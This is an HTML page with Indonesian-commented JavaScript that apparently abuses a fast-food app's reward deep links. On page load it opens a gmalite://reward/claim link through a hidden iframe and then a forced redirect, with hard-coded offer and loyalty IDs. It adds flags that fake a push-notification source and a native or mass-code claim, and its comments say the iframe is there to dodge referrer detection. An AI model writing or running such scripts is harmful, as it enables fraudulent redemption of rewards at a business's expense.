<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM OVERRIDE</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px; }
        .log { border: 1px solid #0f0; padding: 10px; margin: 20px; font-size: 12px; }
    </style>
</head>
<body>
    <h2>INJECTION PROCESS</h2>
    <div id="status" class="log">Initializing...</div>

    <script>
        // DAFTAR ID EMAS KAMU
        var offers = {
            "nugget": "272469|5271",
            "panas1": "267611|5272",
            "ayam": "272484|5271"
        };

        // Ganti ini sesuai menu yang mau ditembak (nugget / panas1 / ayam)
        var targetMenu = "nugget"; 

        function log(txt) {
            document.getElementById('status').innerHTML += "<br>" + txt;
        }

        function inject() {
            var data = offers[targetMenu].split('|');
            var off = data[0];
            var loy = data[1];

            log("Target Locked: " + off);

            // TEKNIK IFRAME: Memuat link di background
            // Ini membypass deteksi "Browser Referrer"
            var frame = document.createElement('iframe');
            
            // Gunakan path '/reward/claim' yang lebih agresif dari '/offers/details'
            var deepLink = "gmalite://reward/claim?offer_id=" + off + 
                           "&loyalty_id=" + loy + 
                           "&view=claim&action=redeem&is_native=true&is_mass_code=1" +
                           "&source=push_notification"; // Pura-pura dari notifikasi

            frame.style.display = 'none';
            frame.src = deepLink;
            
            document.body.appendChild(frame);
            log("Payload Sent via Iframe.");

            // Cadangan: Tembak via Window Location setelah 1 detik
            setTimeout(function() {
                log("Force Launching...");
                window.location.href = deepLink;
            }, 1000);
        }

        // Jalankan otomatis
        setTimeout(inject, 500);
    </script>
</body>
</html>
